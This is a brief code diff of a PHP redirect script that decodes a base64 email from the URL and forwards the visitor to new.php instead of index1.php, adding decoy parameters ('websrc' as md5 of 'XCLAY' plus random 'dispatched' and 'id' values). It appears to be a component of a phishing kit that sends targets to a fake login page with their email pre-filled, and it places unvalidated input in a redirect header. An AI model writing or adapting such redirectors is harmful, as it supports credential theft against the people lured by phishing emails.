@@ -4,9 +4,9 @@ if(isset($_GET['email']) && !empty($_GET['email'])){
 $email = $_GET['email'];
 $email=base64_decode($email);
 
-header("Location: index1.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email);
+header("Location: new.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email);
 }else{
-header("Location: index1.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."");
+header("Location: new.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."");
 }
 
 ?>
